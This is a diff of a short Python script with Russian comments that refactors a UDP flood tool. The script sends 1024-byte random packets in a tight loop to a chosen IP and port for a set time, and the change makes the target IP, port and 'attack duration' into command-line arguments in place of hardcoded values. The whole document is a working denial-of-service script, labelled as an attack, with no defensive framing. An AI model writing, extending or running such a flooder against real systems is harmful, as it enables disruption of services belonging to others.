@@ -1,24 +1,29 @@
 import socket
 import random
 import time
+import argparse
 
-
-def flood(ip: str,
-          port: int,
-          flood_duration: int):
+def flood(target_ip, target_port, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(1024)  # Пакет размером 1024 байта
-    timeout = time.time() + flood_duration
+    timeout = time.time() + duration
     sent = 0
 
     while time.time() < timeout:
-        client.sendto(bytes, (ip, port))
+        client.sendto(bytes, (target_ip, target_port))
         sent += 1
-        print(f"Пакет {sent} отправлен на {ip} через порт {port}")
+        if sent % 100 == 0:
+            print(f"{sent} пакетов отправлено на {target_ip} через порт {target_port}")
 
+def main():
+    parser = argparse.ArgumentParser(description="Программа для генерации сетевого флуда.")
+    parser.add_argument("--ip", type=str, required=True, help="IP-адрес цели.")
+    parser.add_argument("--port", type=int, required=True, help="Порт цели.")
+    parser.add_argument("--duration", type=int, required=True, help="Продолжительность атаки в секундах.")
+
+    args = parser.parse_args()
+
+    flood(args.ip, args.port, args.duration)
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.1"  # IP-адрес цели
-    target_port = 80  # Порт цели
-    duration = 10  # Продолжительность атаки в секундах
-    flood(target_ip, target_port, duration)
+    main()
